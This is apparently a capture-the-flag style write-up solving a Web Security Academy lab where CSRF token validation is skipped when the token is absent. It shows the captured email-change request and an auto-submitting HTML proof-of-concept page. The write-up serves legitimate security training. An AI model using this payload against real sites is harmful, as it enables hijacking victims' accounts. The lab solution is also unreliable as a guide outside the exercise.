## CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login

## Resume

1. Login with `wiener`
2. Update email once
3. Capture `POST /my-account/change-email`
4. Remove the `csrf` parameter
5. Generate a CSRF PoC
6. Send the exploit with **Exploit Server**

## Solve

First, update your email once and capture the request with Burp Suite.

Original request:

```http
POST /my-account/change-email HTTP/2
Host: 0a4600040463e1cc828e337a00810073.web-security-academy.net
Content-Length: 21
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a4600040463e1cc828e337a00810073.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4600040463e1cc828e337a00810073.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=toto%40toto.com
```

The application should normally validate a CSRF token before accepting the request.

However, removing the `csrf` parameter entirely still allows the email change to succeed.

This means the endpoint does not properly validate the CSRF token presence.

Generate a CSRF PoC with Burp Suite or create it manually:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4600040463e1cc828e337a00810073.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@labs.com" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Host the payload on the **Exploit Server**, click **Store**, then **Deliver exploit to victim**.

When the victim loads the page, the browser automatically submits the form using the victim's authenticated session, changing the email address without any valid CSRF token.